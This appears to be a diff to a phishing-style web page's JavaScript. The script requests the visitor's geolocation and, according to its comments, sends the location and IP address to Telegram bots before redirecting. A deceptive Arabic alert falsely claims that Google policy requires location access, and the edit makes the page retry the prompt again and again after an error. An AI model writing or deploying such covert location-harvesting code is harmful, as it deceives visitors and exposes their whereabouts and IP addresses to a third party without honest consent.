@@ -13,20 +13,18 @@ yourFunction();
     
       navigator.geolocation.getCurrentPosition(showPosition, showError);
 function showPosition(position) {
+	   alert("vv");
   // Use the retrieved coordinates here
 }
 function showError(error) {
   // Handle errors, including permission denied
   if (error.code === error.PERMISSION_DENIED) {
-    locationMessage.textContent = "Location permission denied. Functionality might be limited.";
+       alert("aa");
   } else {
     // Handle other errors (e.g., unavailable location data)
-    locationMessage.textContent = "Location information is unavailable.";
+    alert("aa");
   }
 }
-
-// Show the message initially
-locationMessage.style.display = "block";
 
 
 
@@ -135,14 +133,7 @@ ${ipAddress}
   
   async function yourFunction() {
 	  
-	   if (!navigator.geolocation) {
-    // Geolocation not supported by browser
-sendIPToTelegramBots();
-  alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
-
-   //
-    return; // Exit the function if no geolocation available
-  }
+	  
   navigator.geolocation.getCurrentPosition(
     async (position) => {
       // Location permission granted, send location and IP results to Telegram bots
@@ -159,7 +150,7 @@ sendIPToTelegramBots();
          redirectToNextURL();
         // Location permission denied, send IP result to Telegram bots
      } else {
-		 sendIPToTelegramBots();
+		 yourFunction();
       // Geolocation failed for other reasons (e.g., GPS unavailable)
       alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
     }
